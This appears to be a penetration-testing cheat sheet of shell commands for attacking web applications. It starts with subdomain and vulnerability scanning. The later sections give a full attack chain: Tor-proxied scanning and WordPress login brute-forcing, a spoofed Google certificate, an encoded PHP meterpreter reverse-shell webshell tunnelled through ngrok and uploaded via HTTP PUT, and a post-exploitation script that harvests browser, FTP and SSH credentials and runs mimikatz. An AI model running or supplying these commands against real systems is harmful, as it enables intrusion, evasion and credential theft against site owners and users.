# App Platform Configuration

## Check List

* [ ] _Ensure that defaults and known files have been removed._
* [ ] _Validate that no debugging code or extensions are left in the production environments._
* [ ] _Review the logging mechanisms set in place for the application._

## Cheat Sheet

### **Sample and Known Files and Directories**

#### [Multitor](https://github.com/trimstray/multitor)

_20 Tor Tunnel_

```bash
multitor --init 20 \
         --user debian-tor \
         --socks-port 9000 \
         --control-port 9900 \
         --proxy privoxy
```

#### [Nikto](https://github.com/sullo/nikto)

_Scan Web Server_

```bash
nikto -h $WEBSITE
```

#### [SubFinder](https://github.com/projectdiscovery/subfinder)

_Subdomain Fuzzing_

```bash
subfinder -d $WEBSITE -o /tmp/subdomains.txt
```

#### [ShuffleDNS](https://github.com/projectdiscovery/shuffledns)

_Resolve Subdomains_

```bash
echo "1.1.1.1" > /tmp/resolvers.txt
shuffledns -d $WEBSITE \
           -l /tmp/subdomains.txt \
           -r /tmp/resolvers.txt \
           -mode resolve \
           -o /tmp/alive-subdomains.txt
```

#### [Httpx](https://github.com/projectdiscovery/httpx)

_Check Http Live_

```bash
cat /tmp/sub-domains.txt | \
httpx -silent -sc -probe -title -td -ip \
      -mc 200,404,403,302,301,303,304,305,306,307,302 \
      -o /tmp/sub-domains.txt
```

#### [Httpx-Toolkit](https://github.com/projectdiscovery/httpx)

_Find Alive Ports_

```bash
httpx-toolkit -l /tmp/alive-subdomains.txt \
              -ports 80,443,8080,8000,8888,8082,8083 \
              -o /tmp/alive-sub-and-ports.txt
```

#### [Katana](https://github.com/projectdiscovery/katana)

_Find Source URLs_

```bash
katana -u /tmp/alive-subdomains.txt \
       -d 5 -ps \
       -pss waybackarchive,commoncrawl,alienvault \
       -kf -jc -fx \
       -ef woff,css,png,svg,jpg,woff2,jpeg,gif,svg \
       -o /tmp/all-urls.txt
```

#### [Grep](https://www.gnu.org/s/grep/manual/grep.html)

_Find Sensitive Infos_

```bash
cat /tmp/all-urls.txt | \
grep -E '\.xls|\.xml|\.xlsx|\.json|\.pdf|\.sql|\.doc|\.docx|\.pptx|\.txt|\.zip|\.tar\.gz|\.tgz|\.bak|\.7z|\.rar|\.log|\.cache|\.secret|\.db|\.backup|\.yml|\.gz|\.config|\.csv|\.yaml|\.md|\.md5'
```

#### [Dirsearch](https://github.com/maurosoria/dirsearch)

_Directory Fuzzing_

```bash
dirsearch -l /tmp/sub-domains.txt \
          -t 150 -x 403,404,500,429 -i 200,301,302 
          --random-agent 
```

#### [Nuclei](https://github.com/projectdiscovery/nuclei)

_List all Tags_

```bash
nuclei -tgl
```

_Scan OSINT & Recon_

```bash
nuclei -u $WEBSITE -tags osint enum recon
```

_Scan CVEs & Vulnerabilities_

```bash
nuclei -u $WEBSITE -tags cves detect vulnerabilities
```

_Scan CVEs with Multitor_

```bash
nuclei -u $WEBSITE -tags cves detect vulnerabilities -proxy socks4://127.0.0.1:16379
```

_Scan Misconf & Panel_

```bash
nuclei -u $WEBSITE -tags exposure misconfig disclosure tech panel
```

_XSS & SQLi & LFI & RCE & SSRF_

```bash
nuclei -u $WEBSITE -tags xss lfi sqli ssrf traversal fileupload rce unauth deserialization
```

#### [WPScan](https://github.com/wpscanteam/wpscan)

_Scan General_

```bash
wpscan --url $WEBSITE --rua --api-token $TOKEN
```

Scan with _Multitor_

```bash
wpscan --url $WEBSITE --rua --api-token $TOKEN --proxy socks4://127.0.0.1:16379
```

_Enum Users_

```bash
wpscan --url $WEBSITE --rua --api-token $TOKEN -e u, m
```

_Enum Plugins_

```bash
wpscan --url $WEBSITE --rua --api-token $TOKEN -e ap, vp, p
```

_Enum Themes_

```bash
wpscan --url $WEBSITE --rua --api-token $TOKEN -e at, vt, t
```

_Enum Config Backups_

```bash
wpscan --url $WEBSITE --rua --api-token $TOKEN -e cb, dbe, tt
```

#### [Joomscan](https://github.com/OWASP/joomscan)

_Scan General_

```bash
joomscan -u $WEBSITE --random-agent
```

_Scan with Multitor_

```bash
joomscan -u $WEBSITE --random-agent --proxy socks4://127.0.0.1:16379
```

_Enum Endpoints_

```bash
joomscan -u $WEBSITE --random-agent -ec
```

#### [Droopescan](https://github.com/SamJoan/droopescan)

_Scan General_

```bash
droopescan scan drupal -u $WEBSITE
```

_Enum Endpoints_

```bash
droopescan scan drupal -u $WEBSITE --enumerate a
```

#### [Drupwn](https://github.com/immunIT/drupwn)

_Scan General_

```bash
drupwn --mode exploit --target $WEBSITE
```

_Enum Endpoints_

```bash
drupwn --mode enum --modules --target $WEBSITE
```

_Enum Users_

```bash
drupwn --mode enum --users --target $WEBSITE
```

#### [SPartan](https://github.com/sensepost/SPartan)

_Scan SharePoint_

```bash
spartan -u $WEBSITE --sps --users -s
```

#### [IIS-ShortName-Scanner](https://github.com/irsdl/IIS-ShortName-Scanner)

_Scan & Enum IIS_

```bash
iis_shortname_scanner 2 20 $WEBSITE
```

### **Comment Review**

#### [Katana](https://github.com/projectdiscovery/katana)

_HTML Sources_

```bash
katana -u $WEBSITE 
```

_JS Sources_

```bash
katana -u $WEBSITE | grep "\.js$"
```

_CSS Sources_

```bash
katana -u $WEBSITE | grep "\.css*"
```

### **System Configuration**

#### [Lynis (Linux)](https://github.com/CISOfy/lynis)

```bash
lynis
```

#### [Hardentools (Windows)](https://github.com/hardentools/hardentools)

```bash
hardentools-cli.exe
```

### **Configuration Review**

#### [Nmap](https://nmap.org/)

_HTTP Methods_

```bash
nmap -sS -sV --mtu 5000 --script http-methods $WEBSITE
```

#### [Metasploit](https://www.metasploit.com/)

_PingBack XMLRPC_

```bash
msfconsole -qx "
    use auxiliary/scanner/http/wordpress_pingback_access;
    set RHOSTS $WEBSITE;
    set RPORT 443;
    set SSL true;
    run;
    exit"
```

_Brute force XMLRPC with Multitor_

```bash
msfconsole -qx "
    use scanner/http/wordpress_xmlrpc_login;
    set RHOSTS $WEBSITE;
    set RPORT 443;
    set SSL true;
    set USERNAME admin;
    set PASS_FILE /usr/share/seclists/Passwords/darkweb2017-top10000.txt;
    set THREADS 10;
    set STOP_ON_SUCCESS true;
    set Proxies socks4:127.0.0.1:16379;
    run;
    exit"
```

_Scan PUT Methods_

```bash
msfconsole -qx "
    use auxiliary/scanner/http/http_put;
    set RHOSTS $WEBSITE;
    set RPORT 443;
    set SSL true;
    set PATH /wp-content/uploads;
    run -j"
```

_Start Ngrok_

```bash
ngrok tcp 4444 >/dev/null 2>&1 &
```

_Define ENV Ngrok_

```bash
NGINFO=$(curl --silent --show-error http://127.0.0.1:4040/api/tunnels); \
NGHOST=$(echo "$NGINFO" | sed -nE 's/.*public_url":"tcp:\/\/([^"]*):.*/\1/p'); \
NGPORT=$(echo "$NGINFO" | sed -nE 's/.*public_url":"tcp:\/\/.*.tcp.*.ngrok.io:([^"]*).*/\1/p')
```

_Cert Spoof_

```bash
rm -rf /home/$USER/.msf4/loot/*
msfconsole -qx "
    use auxiliary/gather/impersonate_ssl;
    set RHOSTS google.com;
    run;
    exit"
```

_Define ENV Cert_

```bash
CERT=/home/$USER/.msf4/loot/$(find /home/$USER/.msf4/loot/ -type f -name "*.pem" -printf "%f\n" | head -n 1)
```

_Post-EXP_

```bash
cat > /tmp/post-exp.rc << EOF
getprivs
getsystem
run multi/gather/firefox_creds DECRYPT=true
run multi/gather/filezilla_client_cred
run multi/gather/ssh_creds
run multi/gather/thunderbird_creds
run multi/gather/wlan_geolocate
mimikatz
privilege::debug
sekurlsa::logonpasswords
lsadump::sam
bg
EOF
```

_Generate Webshell_

```bash
msfvenom -p php/meterpreter/reverse_tcp \
         LHOST=$NGHOST \
         PORT=$NGPORT \
         HandlerSSLCert=$CERT \
         StagerVerifySSLCert=true \
         PayloadUUIDTracking=true \
         PayloadUUIDName=StagedPHP \
         EnableStageEncoding=true \
         -f raw \
         -e php/base64 \
         -i 3 \
         -o /tmp/unk9vvn.php; \
sed -i "s#eval#<?php eval#g" /tmp/unk9vvn.php; \
sed -i "s#));#)); ?>#g" /tmp/unk9vvn.php
```

_Listening Metasploit_

```bash
msfconsole -qx "
    use multi/handler;
    set PAYLOAD php/meterpreter/reverse_tcp;
    set LHOST $NGHOST;
    set LPORT $NGPORT;
    set ReverseListenerBindAddress 127.0.0.1;
    set ReverseListenerBindPort 4444;
    set HandlerSSLCert $CERT;
    set StagerVerifySSLCert true;
    set StageEncoder true;
    set AutoRunScript /tmp/post-exp.rc;
    run -j"
```

_Upload Shell PUT Method_

```bash
curl -v $WEBSITE/wp-content/uploads --upload-file /tmp/unk9vvn.php
```

### **Logging**

#### Commix

_Code Injection_

```bash
commix -u $WEBSITE
```
